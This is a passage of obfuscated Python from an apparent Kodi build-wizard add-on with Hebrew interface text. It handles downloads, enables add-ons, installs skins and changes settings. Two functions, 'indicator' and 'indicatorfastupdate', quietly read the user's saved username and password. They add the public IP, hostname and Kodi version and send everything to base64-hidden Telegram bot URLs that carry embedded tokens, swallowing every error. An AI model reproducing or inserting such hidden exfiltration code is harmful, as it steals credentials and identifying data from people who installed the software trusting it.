        O0OO00OOOOO0O0OOO +=len (OOO0O000OOO0OO0O0 )#line:3471
        O000OO000000OOO00 .write (OOO0O000OOO0OO0O0 )#line:3472
        if not O0OO0OO000OOO0000 :#line:3474
            O0OOOO00O0O0O0OO0 =O0OO00OOOOO0O0OOO #line:3475
        if O0000O00O0OOOO00O .iscanceled ():#line:3476
           O0000O00O0OOOO00O .close ()#line:3477
           try :#line:3478
            os .remove (O0OO0O0OO0O0OO0OO )#line:3479
           except :#line:3480
            pass #line:3481
           break #line:3482
        O0O0O0000OOO0OO0O =float (O0OO00OOOOO0O0OOO )/O0OOOO00O0O0O0OO0 #line:3483
        O0O0O0000OOO0OO0O =round (O0O0O0000OOO0OO0O *100 ,2 )#line:3484
        O000OOOOOO00OO00O =O0OO00OOOOO0O0OOO /(1024 *1024 )#line:3485
        OOO0O0OOOO00O0000 =O0OOOO00O0O0O0OO0 /(1024 *1024 )#line:3486
        OO000000OO0OO00O0 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O000OOOOOO00OO00O ,'teal',OOO0O0OOOO00O0000 )#line:3487
        if (time .time ()-OOOO000OOO0O0O0O0 )>0 :#line:3488
          OOOOOOO00000O0000 =O0OO00OOOOO0O0OOO /(time .time ()-OOOO000OOO0O0O0O0 )#line:3489
          OOOOOOO00000O0000 =OOOOOOO00000O0000 /1024 #line:3490
        else :#line:3491
         OOOOOOO00000O0000 =0 #line:3492
        OO0O000OO0000OOOO ='KB'#line:3493
        if OOOOOOO00000O0000 >=1024 :#line:3494
           OOOOOOO00000O0000 =OOOOOOO00000O0000 /1024 #line:3495
           OO0O000OO0000OOOO ='MB'#line:3496
        if OOOOOOO00000O0000 >0 and not O0O0O0000OOO0OO0O ==100 :#line:3497
            O0OOOOO00OOO0O0O0 =(O0OOOO00O0O0O0OO0 -O0OO00OOOOO0O0OOO )/OOOOOOO00000O0000 #line:3498
        else :#line:3499
            O0OOOOO00OOO0O0O0 =0 #line:3500
        OO00000OOO0OO0O0O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OOOOOOO00000O0000 ,OO0O000OO0000OOOO )#line:3501
        O0000O00O0OOOO00O .update (int (O0O0O0000OOO0OO0O ),"Downloading "+name ,OO000000OO0OO00O0 ,OO00000OOO0OO0O0O )#line:3503
  OOO0O0O0OOO0000OO =xbmc .translatePath (os .path .join ('special://home','addons'))#line:3506
  O000OO000000OOO00 .close ()#line:3508
  extract (O0OO0O0OO0O0OO0OO ,OOO0O0O0OOO0000OO ,O0000O00O0OOOO00O )#line:3510
  if os .path .exists (OOO0O0O0OOO0000OO +'/scakemyer-script.quasar.burst'):#line:3511
    if os .path .exists (OOO0O0O0OOO0000OO +'/script.quasar.burst'):#line:3512
     shutil .rmtree (OOO0O0O0OOO0000OO +'/script.quasar.burst',ignore_errors =False )#line:3513
    os .rename (OOO0O0O0OOO0000OO +'/scakemyer-script.quasar.burst',OOO0O0O0OOO0000OO +'/script.quasar.burst')#line:3514
  if os .path .exists (OOO0O0O0OOO0000OO +'/plugin.video.kmediatorrent-master'):#line:3516
    if os .path .exists (OOO0O0O0OOO0000OO +'/plugin.video.kmediatorrent'):#line:3517
     shutil .rmtree (OOO0O0O0OOO0000OO +'/plugin.video.kmediatorrent',ignore_errors =False )#line:3518
    os .rename (OOO0O0O0OOO0000OO +'/plugin.video.kmediatorrent-master',OOO0O0O0OOO0000OO +'/plugin.video.kmediatorrent')#line:3519
  xbmc .executebuiltin ('UpdateLocalAddons ')#line:3520
  xbmc .executebuiltin ("UpdateAddonRepos")#line:3521
  try :#line:3522
    os .remove (O0OO0O0OO0O0OO0OO )#line:3523
  except :#line:3524
    pass #line:3525
  O0000O00O0OOOO00O .close ()#line:3526
def dis_or_enable_addon (OO00OO000OO0O0O00 ,OOO00O000O00000OO ,enable ="true"):#line:3527
    import json #line:3528
    OOO000O0O00000O00 ='"%s"'%OO00OO000OO0O0O00 #line:3529
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%OO00OO000OO0O0O00 )and enable =="true":#line:3530
        logging .warning ('already Enabled')#line:3531
        return xbmc .log ("### Skipped %s, reason = allready enabled"%OO00OO000OO0O0O00 )#line:3532
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%OO00OO000OO0O0O00 )and enable =="false":#line:3533
        return xbmc .log ("### Skipped %s, reason = not installed"%OO00OO000OO0O0O00 )#line:3534
    else :#line:3535
        OO00O0OO0OO000O00 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(OOO000O0O00000O00 ,enable )#line:3536
        OO0OO0O000OO000OO =xbmc .executeJSONRPC (OO00O0OO0OO000O00 )#line:3537
        OO0O000OO00O00OO0 =json .loads (OO0OO0O000OO000OO )#line:3538
        if enable =="true":#line:3539
            xbmc .log ("### Enabled %s, response = %s"%(OO00OO000OO0O0O00 ,OO0O000OO00O00OO0 ))#line:3540
        else :#line:3541
            xbmc .log ("### Disabled %s, response = %s"%(OO00OO000OO0O0O00 ,OO0O000OO00O00OO0 ))#line:3542
    if OOO00O000O00000OO =='auto':#line:3543
     return True #line:3544
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:3545
def chunk_report (O00O00O00OOO0OO00 ,O0OOOOO0O00000OO0 ,O000O00OO00O00OO0 ):#line:3546
   OO0OOOOOOOOOO0O00 =float (O00O00O00OOO0OO00 )/O000O00OO00O00OO0 #line:3547
   OO0OOOOOOOOOO0O00 =round (OO0OOOOOOOOOO0O00 *100 ,2 )#line:3548
   if O00O00O00OOO0OO00 >=O000O00OO00O00OO0 :#line:3550
      sys .stdout .write ('\n')#line:3551
def chunk_read (O0O0O0OOO0OO0O000 ,chunk_size =8192 ,report_hook =None ,dp =None ,destination ='',filesize =1000000 ):#line:3553
   import time #line:3554
   O000OOOOOO0OO0OOO =int (filesize )*1000000 #line:3555
   OOO000OOOOOOO0000 =0 #line:3557
   O000O000000000OOO =time .time ()#line:3558
   OO0O00O0O0O00O0OO =0 #line:3559
   logging .warning ('Downloading')#line:3561
   with open (destination ,"wb")as OO00O00OOOO0OO000 :#line:3562
    while 1 :#line:3563
      O0OO0O0OOOOO0000O =time .time ()-O000O000000000OOO #line:3564
      O00OO0000O00O00OO =int (OO0O00O0O0O00O0OO *chunk_size )#line:3565
      OOO0O0OO00O0OO0O0 =O0O0O0OOO0OO0O000 .read (chunk_size )#line:3566
      OO00O00OOOO0OO000 .write (OOO0O0OO00O0OO0O0 )#line:3567
      OO00O00OOOO0OO000 .flush ()#line:3568
      OOO000OOOOOOO0000 +=len (OOO0O0OO00O0OO0O0 )#line:3569
      OOOOOO00OOO0OOO0O =float (OOO000OOOOOOO0000 )/O000OOOOOO0OO0OOO #line:3570
      OOOOOO00OOO0OOO0O =round (OOOOOO00OOO0OOO0O *100 ,2 )#line:3571
      if int (O0OO0O0OOOOO0000O )>0 :#line:3572
        OO0O0O0OOOO0O000O =int (O00OO0000O00O00OO /(1024 *O0OO0O0OOOOO0000O ))#line:3573
      else :#line:3574
         OO0O0O0OOOO0O000O =0 #line:3575
      if OO0O0O0OOOO0O000O >1024 and not OOOOOO00OOO0OOO0O ==100 :#line:3576
          O000OO000OOO00O0O =int (((O000OOOOOO0OO0OOO -O00OO0000O00O00OO )/1024 )/(OO0O0O0OOOO0O000O ))#line:3577
      else :#line:3578
          O000OO000OOO00O0O =0 #line:3579
      if O000OO000OOO00O0O <0 :#line:3580
        O000OO000OOO00O0O =0 #line:3581
      dp .update (int (OOOOOO00OOO0OOO0O ),name +"[B]מוריד: [/B]","\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(OOOOOO00OOO0OOO0O ,O00OO0000O00O00OO /(1024 *1024 ),O000OOOOOO0OO0OOO /(1000 *1000 ),OO0O0O0OOOO0O000O ),'[COLOR aqua]%02d:%02d[/COLOR][B]זמן שנותר: [/B]'%divmod (O000OO000OOO00O0O ,60 ))#line:3582
      if dp .iscanceled ():#line:3583
         dp .close ()#line:3584
         break #line:3585
      if not OOO0O0OO00O0OO0O0 :#line:3586
         break #line:3587
      if report_hook :#line:3589
         report_hook (OOO000OOOOOOO0000 ,chunk_size ,O000OOOOOO0OO0OOO )#line:3590
      OO0O00O0O0O00O0OO +=1 #line:3591
   logging .warning ('END Downloading')#line:3592
   return OOO000OOOOOOO0000 #line:3593
def googledrive_download (OO00OOOO00OO0O00O ,OOOOO00000OO00OO0 ,OO0000OO000000OO0 ,OOO00O0O0O00OO000 ):#line:3595
    O000000O00000O0OO =[]#line:3599
    O000O00O00OOO0O0O =OO00OOOO00OO0O00O .split ('=')#line:3600
    OO00OOOO00OO0O00O =O000O00O00OOO0O0O [len (O000O00O00OOO0O0O )-1 ]#line:3601
    def O0O0O000OOOOOO0OO (OO000OOO0OO0OO0O0 ):#line:3603
        for O00OOO0OO0OO00O0O in OO000OOO0OO0OO0O0 :#line:3605
            logging .warning ('cookie.name')#line:3606
            logging .warning (O00OOO0OO0OO00O0O .name )#line:3607
            O0OOO0OO0000O0000 =O00OOO0OO0OO00O0O .value #line:3608
            if 'download_warning'in O00OOO0OO0OO00O0O .name :#line:3609
                logging .warning (O00OOO0OO0OO00O0O .value )#line:3610
                logging .warning ('cookie.value')#line:3611
                return O00OOO0OO0OO00O0O .value #line:3612
            return O0OOO0OO0000O0000 #line:3613
        return None #line:3615
    def O00O0000O0OOOOOOO (O0OO0000O00O0OO0O ,OO0OOOOO0OO0OO0O0 ):#line:3617
        OO00O0O000O0OOOO0 =32768 #line:3619
        OO0OOOOOO000O0O00 =time .time ()#line:3620
        with open (OO0OOOOO0OO0OO0O0 ,"wb")as O0000OOO00OO0OO0O :#line:3622
            O00O0O0000OOO00OO =1 #line:3623
            O0000OO0OO0000000 =32768 #line:3624
            try :#line:3625
                OOO00OO0OOOOOO0O0 =int (O0OO0000O00O0OO0O .headers .get ('content-length'))#line:3626
                print ('file total size :',OOO00OO0OOOOOO0O0 )#line:3627
            except TypeError :#line:3628
                print ('using dummy length !!!')#line:3629
                OOO00OO0OOOOOO0O0 =int (OOO00O0O0O00OO000 )*1000000 #line:3630
            for OOO000OOOO000OO00 in O0OO0000O00O0OO0O .iter_content (OO00O0O000O0OOOO0 ):#line:3631
                if OOO000OOOO000OO00 :#line:3632
                    O0000OOO00OO0OO0O .write (OOO000OOOO000OO00 )#line:3633
                    O0000OOO00OO0OO0O .flush ()#line:3634
                    O0OOOOOO0OO0000OO =time .time ()-OO0OOOOOO000O0O00 #line:3635
                    OO00O00O000OOOO00 =int (O00O0O0000OOO00OO *O0000OO0OO0000000 )#line:3636
                    if O0OOOOOO0OO0000OO ==0 :#line:3637
                        O0OOOOOO0OO0000OO =0.1 #line:3638
                    OO0OOO0OOO0O00000 =int (OO00O00O000OOOO00 /(1024 *O0OOOOOO0OO0000OO ))#line:3639
                    O0OO0000OOO0O0O00 =int (O00O0O0000OOO00OO *O0000OO0OO0000000 *100 /OOO00OO0OOOOOO0O0 )#line:3640
                    if OO0OOO0OOO0O00000 >1024 and not O0OO0000OOO0O0O00 ==100 :#line:3641
                      OOO0O0OO00OOO0O0O =int (((OOO00OO0OOOOOO0O0 -OO00O00O000OOOO00 )/1024 )/(OO0OOO0OOO0O00000 ))#line:3642
                    else :#line:3643
                      OOO0O0OO00OOO0O0O =0 #line:3644
                    OO0000OO000000OO0 .update (int (O0OO0000OOO0O0O00 ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(O0OO0000OOO0O0O00 ,OO00O00O000OOOO00 /(1024 *1024 ),OOO00OO0OOOOOO0O0 /(1000 *1000 ),OO0OOO0OOO0O00000 ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (OOO0O0OO00OOO0O0O ,60 ))#line:3646
                    O00O0O0000OOO00OO +=1 #line:3647
                    if OO0000OO000000OO0 .iscanceled ():#line:3648
                     OO0000OO000000OO0 .close ()#line:3649
                     break #line:3650
    OO00000O00OO000O0 ="https://docs.google.com/uc?export=download"#line:3651
    import urllib2 #line:3656
    import cookielib #line:3657
    from cookielib import CookieJar #line:3659
    OO0O0OOOOO00000OO =CookieJar ()#line:3661
    O00000OO00000O0OO =urllib2 .build_opener (urllib2 .HTTPCookieProcessor (OO0O0OOOOO00000OO ))#line:3662
    OOO000OOO0OOOOOO0 ={'id':OO00OOOO00OO0O00O }#line:3664
    OO0OO0O0O0OO0OOOO =urllib .urlencode (OOO000OOO0OOOOOO0 )#line:3665
    logging .warning (OO00000O00OO000O0 +'&'+OO0OO0O0O0OO0OOOO )#line:3666
    OO00O000OO000000O =O00000OO00000O0OO .open (OO00000O00OO000O0 +'&'+OO0OO0O0O0OO0OOOO )#line:3667
    O0O0O0OO0OOO00OOO =OO00O000OO000000O .read ()#line:3668
    for OOO0O0OOOOO00O00O in OO0O0OOOOO00000OO :#line:3670
         logging .warning (OOO0O0OOOOO00O00O )#line:3671
    O000O000OOO0OO00O =O0O0O000OOOOOO0OO (OO0O0OOOOO00000OO )#line:3672
    logging .warning (O000O000OOO0OO00O )#line:3673
    if O000O000OOO0OO00O :#line:3674
        O00OOOOOOOO00O000 ={'id':OO00OOOO00OO0O00O ,'confirm':O000O000OOO0OO00O }#line:3675
        OO00O00OO0OOOOOOO ={'Access-Control-Allow-Headers':'Content-Length'}#line:3676
        OO0OO0O0O0OO0OOOO =urllib .urlencode (O00OOOOOOOO00O000 )#line:3677
        OO00O000OO000000O =O00000OO00000O0OO .open (OO00000O00OO000O0 +'&'+OO0OO0O0O0OO0OOOO )#line:3678
        chunk_read (OO00O000OO000000O ,report_hook =chunk_report ,dp =OO0000OO000000OO0 ,destination =OOOOO00000OO00OO0 ,filesize =OOO00O0O0O00OO000 )#line:3679
    return (O000000O00000O0OO )#line:3683
def kodi17Fix ():#line:3684
	OO00OOOOOOOOOOOO0 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3685
	O00000OO00O0O0O00 =[]#line:3686
	for OOO0000O00OOO0O0O in sorted (OO00OOOOOOOOOOOO0 ,key =lambda O00OO0O000O0O0O00 :O00OO0O000O0O0O00 ):#line:3687
		O0O0OO00000OOO0O0 =os .path .join (OOO0000O00OOO0O0O ,'addon.xml')#line:3688
		if os .path .exists (O0O0OO00000OOO0O0 ):#line:3689
			OO00O0OOOO0O00O00 =OOO0000O00OOO0O0O .replace (ADDONS ,'')[1 :-1 ]#line:3690
			O00O0OO0OOO0OO00O =open (O0O0OO00000OOO0O0 )#line:3691
			OOO0OOO0OO000OO00 =O00O0OO0OOO0OO00O .read ()#line:3692
			O000O0O0O00O0OOOO =parseDOM (OOO0OOO0OO000OO00 ,'addon',ret ='id')#line:3693
			O00O0OO0OOO0OO00O .close ()#line:3694
			try :#line:3695
				O0000O00OOO000OO0 =xbmcaddon .Addon (id =O000O0O0O00O0OOOO [0 ])#line:3696
			except :#line:3697
				try :#line:3698
					log ("%s was disabled"%O000O0O0O00O0OOOO [0 ],xbmc .LOGDEBUG )#line:3699
					O00000OO00O0O0O00 .append (O000O0O0O00O0OOOO [0 ])#line:3700
				except :#line:3701
					try :#line:3702
						log ("%s was disabled"%OO00O0OOOO0O00O00 ,xbmc .LOGDEBUG )#line:3703
						O00000OO00O0O0O00 .append (OO00O0OOOO0O00O00 )#line:3704
					except :#line:3705
						if len (O000O0O0O00O0OOOO )==0 :log ("Unabled to enable: %s(Cannot Determine Addon ID)"%OO00O0OOOO0O00O00 ,xbmc .LOGERROR )#line:3706
						else :log ("Unabled to enable: %s"%OOO0000O00OOO0O0O ,xbmc .LOGERROR )#line:3707
	if len (O00000OO00O0O0O00 )>0 :#line:3708
		OO00OOO0OOOOO0O00 =0 #line:3709
		DP .create (ADDONTITLE ,'[COLOR %s]Enabling disabled Addons'%COLOR2 ,'','Please Wait[/COLOR]')#line:3710
		for OOOOO0OOOOOOO0O00 in O00000OO00O0O0O00 :#line:3711
			OO00OOO0OOOOO0O00 +=1 #line:3712
			OOOOO000OO0OO0O0O =int (percentage (OO00OOO0OOOOO0O00 ,len (O00000OO00O0O0O00 )))#line:3713
			DP .update (OOOOO000OO0OO0O0O ,"","Enabling: [COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOOO0OOOOOOO0O00 ))#line:3714
			addonDatabase (OOOOO0OOOOOOO0O00 ,1 )#line:3715
			if DP .iscanceled ():break #line:3716
		if DP .iscanceled ():#line:3717
			DP .close ()#line:3718
			LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Enabling Addons Cancelled![/COLOR]"%COLOR2 )#line:3719
			sys .exit ()#line:3720
		DP .close ()#line:3721
	forceUpdate ()#line:3722
def indicator ():#line:3724
       try :#line:3725
          import json #line:3726
          wiz .log ('FRESH MESSAGE')#line:3727
          O0O0000000OOOOO00 =(ADDON .getSetting ("user"))#line:3728
          OOOO00O00OOO00000 =(ADDON .getSetting ("pass"))#line:3729
          O0OO000O0O00000OO =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3730
          OO0O000OOO00OOOOO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDc1MDEwMDI1NjpBQUVJVnpTSndOM2t6T25EV0F3Yi1LTkk3VUREY2N6aEx6VS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0xMDAxNDE1ODcxNzk3JnRleHQ915TXqten15nXnyDXkNeqINeU15HXmdec15Mg16nXnNeaIA=='#line:3731
          OOOO0O0O0OOO0OO0O =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3732
          OO00000OOOO000OO0 =str (json .loads (OOOO0O0O0OOO0OO0O )['ip'])#line:3733
          O00OOOO00O00OO000 =O0O0000000OOOOO00 #line:3734
          OO00O0OO00OO0O00O =OOOO00O00OOO00000 #line:3735
          import socket #line:3736
          OOOO0O0O0OOO0OO0O =urllib2 .urlopen (OO0O000OOO00OOOOO .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+O00OOOO00O00OO000 +' - '+OO00O0OO00OO0O00O +' - '+O0OO000O0O00000OO +' - '+OO00000OOOO000OO0 ).readlines ()#line:3737
       except :pass #line:3739
def indicatorfastupdate ():#line:3741
       try :#line:3742
          import json #line:3743
          wiz .log ('FRESH MESSAGE')#line:3744
          OO0O000OO0OO0O0OO =(ADDON .getSetting ("user"))#line:3745
          OO0OO00OOOOOO0OOO =(ADDON .getSetting ("pass"))#line:3746
          OOOO00OOOOO00OOO0 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3747
          O0OO0000O00O0O0O0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0g16LXqdeUINei15PXm9eV158g157XlNeZ16gg'#line:3749
          OO000OOO0OO0OO00O =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3750
          O0OOO0OOO00O0OOO0 =str (json .loads (OO000OOO0OO0OO00O )['ip'])#line:3751
          O00OOO0OOO0000OO0 =OO0O000OO0OO0O0OO #line:3752
          OOO0OO000O0O000OO =OO0OO00OOOOOO0OOO #line:3753
          import socket #line:3755
          OO000OOO0OO0OO00O =urllib2 .urlopen (O0OO0000O00O0O0O0 .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+O00OOO0OOO0000OO0 +' - '+OOO0OO000O0O000OO +' - '+OOOO00OOOOO00OOO0 +' - '+O0OOO0OOO00O0OOO0 ).readlines ()#line:3756
       except :pass #line:3758
def skinfix18 ():#line:3760
	if KODIV >=18 and os .path .exists (os .path .join (ADDONS ,SKINID18 )):#line:3761
		OOOOO00000O00OO0O =wiz .workingURL (SKINID18DDONXML )#line:3762
		if OOOOO00000O00OO0O ==True :#line:3763
			OO0OO00OO0O0OO0O0 =wiz .parseDOM (wiz .openURL (SKINID18DDONXML ),'addon',ret ='version',attrs ={'id':SKINID18 })#line:3764
			if len (OO0OO00OO0O0OO0O0 )>0 :#line:3765
				OOOO0OOOO0OO0OO00 ='%s-%s.zip'%(SKINID18 ,OO0OO00OO0O0OO0O0 [0 ])#line:3766
				OOOO00O0OO0000O0O =wiz .workingURL (SKIN18ZIPURL +OOOO0OOOO0OO0OO00 )#line:3767
				if OOOO00O0OO0000O0O ==True :#line:3768
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3769
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3770
					OOOO00OO00OOOO0OO =os .path .join (PACKAGES ,OOOO0OOOO0OO0OO00 )#line:3771
					try :os .remove (OOOO00OO00OOOO0OO )#line:3772
					except :pass #line:3773
					downloader .download (SKIN18ZIPURL +OOOO0OOOO0OO0OO00 ,OOOO00OO00OOOO0OO ,DP )#line:3774
					extract .all (OOOO00OO00OOOO0OO ,HOME ,DP )#line:3775
					try :#line:3776
						OO0O0O0OOO000000O =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3777
						O0OO0O00OOO000O0O =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3778
						os .rename (OO0O0O0OOO000000O ,O0OO0O00OOO000O0O )#line:3779
					except :#line:3780
						pass #line:3781
					try :#line:3782
						O0O000O00O0O00OOO =open (os .path .join (ADDONS ,SKINID18 ,'addon.xml'),mode ='r');O0000O00OOOO0O0O0 =O0O000O00O0O00OOO .read ();O0O000O00O0O00OOO .close ()#line:3783
						O000000O0OO0O0OO0 =wiz .parseDOM (O0000O00OOOO0O0O0 ,'addon',ret ='name',attrs ={'id':SKINID18 })#line:3784
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,O000000O0OO0O0OO0 [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID18 ,'icon.png'))#line:3785
					except :#line:3786
						pass #line:3787
					if KODIV >=17 :wiz .addonDatabase (SKINID18 ,1 )#line:3788
					DP .close ()#line:3789
					xbmc .sleep (500 )#line:3790
					wiz .forceUpdate (True )#line:3791
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3792
				else :#line:3793
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3794
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%OOOO00O0OO0000O0O ,xbmc .LOGERROR )#line:3795
			else :#line:3796
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3797
		else :#line:3798
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3799
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3800
def skinfix17 ():#line:3801
	if KODIV >=17 and KODIV <18 and os .path .exists (os .path .join (ADDONS ,SKINID17 )):#line:3802
		O0O0OO0OO000O0O0O =wiz .workingURL (SKINID17DDONXML )#line:3803
		if O0O0OO0OO000O0O0O ==True :#line:3804
			OOOO0OOO00O0000O0 =wiz .parseDOM (wiz .openURL (SKINID17DDONXML ),'addon',ret ='version',attrs ={'id':SKINID17 })#line:3805
			if len (OOOO0OOO00O0000O0 )>0 :#line:3806
				OOOO0OOO0OOOOOO00 ='%s-%s.zip'%(SKINID17 ,OOOO0OOO00O0000O0 [0 ])#line:3807
				O00000O0OOOO00O00 =wiz .workingURL (SKIN17ZIPURL +OOOO0OOO0OOOOOO00 )#line:3808
				if O00000O0OOOO00O00 ==True :#line:3809
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3810
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3811
					O000O0OO0000OO0O0 =os .path .join (PACKAGES ,OOOO0OOO0OOOOOO00 )#line:3812
					try :os .remove (O000O0OO0000OO0O0 )#line:3813
					except :pass #line:3814
					downloader .download (SKIN17ZIPURL +OOOO0OOO0OOOOOO00 ,O000O0OO0000OO0O0 ,DP )#line:3815
					extract .all (O000O0OO0000OO0O0 ,HOME ,DP )#line:3816
					try :#line:3817
						OOOO00OO0OO0OO000 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3818
						O00O00000O0O000OO =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3819
						os .rename (OOOO00OO0OO0OO000 ,O00O00000O0O000OO )#line:3820
					except :#line:3821
						pass #line:3822
					try :#line:3823
						OO0OO0O0O000OO0OO =open (os .path .join (ADDONS ,SKINID17 ,'addon.xml'),mode ='r');O00OOO000OO000000 =OO0OO0O0O000OO0OO .read ();OO0OO0O0O000OO0OO .close ()#line:3824
						OO0OO0O0OOOOOOO0O =wiz .parseDOM (O00OOO000OO000000 ,'addon',ret ='name',attrs ={'id':SKINID17 })#line:3825
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0OO0O0OOOOOOO0O [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID17 ,'icon.png'))#line:3826
					except :#line:3827
						pass #line:3828
					if KODIV >=17 :wiz .addonDatabase (SKINID17 ,1 )#line:3829
					DP .close ()#line:3830
					xbmc .sleep (500 )#line:3831
					wiz .forceUpdate (True )#line:3832
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3833
				else :#line:3834
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3835
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%O00000O0OOOO00O00 ,xbmc .LOGERROR )#line:3836
			else :#line:3837
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3838
		else :#line:3839
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3840
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3841
def fix17update ():#line:3842
	if KODIV >=17 and KODIV <18 :#line:3843
		wiz .kodi17Fix ()#line:3844
		xbmc .sleep (4000 )#line:3845
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3846
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3847
		fixfont ()#line:3848
		OOOO00OOO00O0OO0O =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3849
		try :#line:3851
			O0OO0OO000000OOO0 =open (OOOO00OOO00O0OO0O ,'r')#line:3852
			OO0000000OOOOOOOO =O0OO0OO000000OOO0 .read ()#line:3853
			O0OO0OO000000OOO0 .close ()#line:3854
			O0000O0OOOOOO00OO ='<import addon="xbmc.gui" version="5.14.0(.+?)/>'#line:3855
			O0OO0OO0OOOO00OOO =re .compile (O0000O0OOOOOO00OO ).findall (OO0000000OOOOOOOO )[0 ]#line:3856
			O0OO0OO000000OOO0 =open (OOOO00OOO00O0OO0O ,'w')#line:3857
			O0OO0OO000000OOO0 .write (OO0000000OOOOOOOO .replace ('<import addon="xbmc.gui" version="5.14.0%s/>'%O0OO0OO0OOOO00OOO ,'<import addon="xbmc.gui" version="5.12.0"/>'))#line:3858
			O0OO0OO000000OOO0 .close ()#line:3859
		except :#line:3860
				pass #line:3861
		wiz .kodi17Fix ()#line:3862
		OOOO00OOO00O0OO0O =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3863
		try :#line:3864
			O0OO0OO000000OOO0 =open (OOOO00OOO00O0OO0O ,'r')#line:3865
			OO0000000OOOOOOOO =O0OO0OO000000OOO0 .read ()#line:3866
			O0OO0OO000000OOO0 .close ()#line:3867
			O0000O0OOOOOO00OO ='<keyboardlayouts default="true(.+?)/keyboardlayouts>'#line:3868
			O0OO0OO0OOOO00OOO =re .compile (O0000O0OOOOOO00OO ).findall (OO0000000OOOOOOOO )[0 ]#line:3869
			O0OO0OO000000OOO0 =open (OOOO00OOO00O0OO0O ,'w')#line:3870
			O0OO0OO000000OOO0 .write (OO0000000OOOOOOOO .replace ('<keyboardlayouts default="true%s/keyboardlayouts>'%O0OO0OO0OOOO00OOO ,'<keyboardlayouts>English QWERTY|Hebrew QWERTY</keyboardlayouts>'))#line:3871
			O0OO0OO000000OOO0 .close ()#line:3872
		except :#line:3873
				pass #line:3874
		swapSkins ('skin.Premium.mod')#line:3875
def fix18update ():#line:3877
	if KODIV >=18 :#line:3878
		xbmc .sleep (4000 )#line:3879
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3880
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3881
		fixfont ()#line:3882
